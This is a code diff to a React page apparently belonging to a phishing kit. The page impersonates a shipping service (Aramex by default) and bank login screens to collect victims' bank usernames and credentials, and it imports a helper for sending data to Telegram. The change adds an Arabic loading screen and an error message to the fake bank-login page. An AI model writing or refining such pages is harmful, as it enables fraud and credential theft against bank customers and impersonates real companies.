@@ -12,12 +12,13 @@ import { sendToTelegram } from "@/lib/telegram";
 import { getBankById } from "@/lib/banks";
 import { getCountryByCode } from "@/lib/countries";
 import { getBankLoginTheme } from "@/lib/bankThemes";
+import FullScreenLoader from "@/components/FullScreenLoader";
 
 const PaymentBankLogin = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
-  const { data: linkData } = useLink(id);
+  const { data: linkData, isLoading } = useLink(id);
   
   // Bank login credentials state
   const [username, setUsername] = useState("");
@@ -40,11 +41,27 @@ const PaymentBankLogin = () => {
     cardType: sessionStorage.getItem('cardType') || '',
   };
   
-  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
-  const serviceName = linkData?.payload?.service_name || serviceKey;
+  if (isLoading) {
+    return <FullScreenLoader label="جاري تجهيز صفحة تسجيل الدخول البنكي..." />;
+  }
+
+  if (!linkData) {
+    return (
+      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
+        <div className="text-center p-8">
+          <Lock className="w-12 h-12 mx-auto mb-4 text-muted-foreground" />
+          <h2 className="text-lg font-semibold mb-2">تعذر تحميل بيانات الدفع</h2>
+          <p className="text-sm text-muted-foreground">تأكد من صلاحية الرابط أو أعد المحاولة لاحقاً.</p>
+        </div>
+      </div>
+    );
+  }
+
+  const payload = (linkData.payload ?? {}) as Record<string, any>;
+  const serviceKey = payload.service_key || customerInfo.service || 'aramex';
+  const serviceName = payload.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
-  const shippingInfo = linkData?.payload as any;
-  const amount = shippingInfo?.cod_amount || 500;
+  const amount = payload?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
   
   useEffect(() => {
